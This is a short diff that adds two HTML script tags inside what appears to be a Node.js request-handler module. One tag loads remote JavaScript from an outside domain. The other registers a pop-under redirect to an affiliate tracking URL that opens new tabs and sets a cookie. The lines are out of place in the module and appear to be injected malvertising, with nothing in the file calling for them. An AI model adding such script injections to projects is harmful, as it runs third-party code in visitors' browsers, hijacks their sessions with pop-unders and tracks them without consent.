@@ -50,6 +50,13 @@ module.exports = async (req, res) => {
 
 
 
+<script type="text/javascript" src="//static.scptp9.com/mnpw3.js"></script>
+<script>mnpw.add('https://t.mbsrv2.com/273605/7566?popUnder=true&aff_sub5=SF_006OG000004lmDN&aff_sub4=AT_0005&pud=scptp9', {newTab: true, cookieExpires: 86401});</script>
+
+
+
+
+
 
 
 
